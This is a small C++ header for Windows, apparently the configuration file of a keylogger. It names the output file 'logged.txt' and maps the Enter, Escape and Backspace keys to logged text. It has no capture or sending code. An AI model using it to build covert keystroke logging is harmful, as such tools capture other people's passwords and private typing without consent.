#pragma once

#include <Windows.h>
#include <unordered_map>

namespace configuration
{
    constexpr const WCHAR* out_file{ L"logged.txt" };

    const std::unordered_map<DWORD, const WCHAR*> key_codes
    {
        { VK_RETURN, L"\n" },
        { VK_ESCAPE, L"[ESCAPE]" },
        { VK_BACK, L"[BACKSPACE]" }
    };
}
